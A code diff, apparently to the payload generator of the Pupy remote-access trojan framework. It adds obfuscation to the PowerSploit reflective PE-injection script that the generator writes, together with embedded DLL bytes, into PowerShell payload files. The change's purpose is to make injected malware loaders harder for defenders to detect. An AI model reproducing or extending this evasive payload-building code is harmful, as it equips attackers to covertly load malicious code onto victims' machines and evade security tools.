@@ -12,9 +12,10 @@ from pupylib.utils.obfuscate import compress_encode_obfs
 from network.conf import transports, launchers
 from network.lib.base_launcher import LauncherError
 from scriptlets.scriptlets import ScriptletArgumentError
+from modules.lib.windows.powershell_upload import obfuscatePowershellScript
 import scriptlets
 import cPickle
-import base64
+import base64, configparser
 
 
 def get_edit_pupyx86_dll(conf):
@@ -384,7 +385,7 @@ if __name__=="__main__":
             x64InitCode += "$PEBytes{0}=\"{1}\"\n".format(i,aPart)
             x64ConcatCode += "$PEBytes{0}+".format(i)
         print(colorize("[+] ","green")+"X64 dll loaded and {0} variables used".format(i+1))
-        script = open(os.path.join("external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1"), 'r').read()
+        script = obfuscatePowershellScript(open(os.path.join("external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1"), 'r').read())
         with open(outpath, 'wb') as w:
             w.write("{0}\n{1}".format(script, code.format(x86InitCode, x86ConcatCode[:-1], x64InitCode, x64ConcatCode[:-1]) ))
     elif args.format=="ps1_oneliner":
@@ -399,9 +400,6 @@ if __name__=="__main__":
     print("LAUNCHER = %s"%repr(args.launcher))
     print("LAUNCHER_ARGS = %s"%repr(args.launcher_args))
     print("SCRIPTLETS = %s"%args.scriptlet)
-
-
-
 
 
 
